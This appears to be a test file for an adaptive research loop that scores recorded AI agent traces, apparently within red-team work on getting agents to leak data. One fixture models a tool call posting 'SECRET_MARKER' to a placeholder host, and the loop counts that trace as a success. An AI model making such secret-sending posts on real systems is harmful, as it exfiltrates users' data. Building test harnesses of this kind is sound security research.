from pcro.adaptive import AdaptiveResearchLoop, trace_features
from pcro.model import Trace, TraceEvent


def marker_trace(trace_id="marker"):
    return Trace(
        trace_id,
        (
            TraceEvent(
                "http.post",
                source="tool",
                side_effect="SHARE",
                latency_ms=100,
                metadata={
                    "args": {"url": "https://benchmark.invalid", "data": "SECRET_MARKER"}
                },
            ),
        ),
        ("post benchmark payload",),
    )


def benign_trace(trace_id="benign"):
    return Trace(
        trace_id,
        (TraceEvent("fs.read", source="file", side_effect="READ", latency_ms=100),),
        ("read benchmark note",),
    )


def test_feature_vector_is_stable_dimension():
    assert len(trace_features(marker_trace())) == len(trace_features(benign_trace()))


def test_closed_loop_records_success_and_failure():
    loop = AdaptiveResearchLoop()
    good = marker_trace()
    bad = benign_trace()
    for _ in range(12):
        loop.observe("family-good", good, success=True, replay_cost_ms=100)
        loop.observe("family-bad", bad, success=False, replay_cost_ms=100, failure_stage="no_predicate")
    assert loop.arms["family-good"].posterior_mean > loop.arms["family-bad"].posterior_mean
    assert loop.failures.most_common(1)[0][0] == ("family-bad", "no_predicate")
